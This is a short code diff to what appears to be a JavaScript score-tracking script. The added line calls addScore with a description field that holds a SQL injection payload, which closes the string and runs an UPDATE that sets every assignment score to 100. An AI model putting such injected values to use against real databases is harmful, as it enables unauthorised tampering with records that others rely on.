@@ -28,4 +28,4 @@ let addScore = async (person, score, description) => {
 
 };
 addScore("Hamad", 100, "Mission Log 2");
-
+addScore("Eric", 110, "Hack the Database');update assignments set score = 100;select ('")
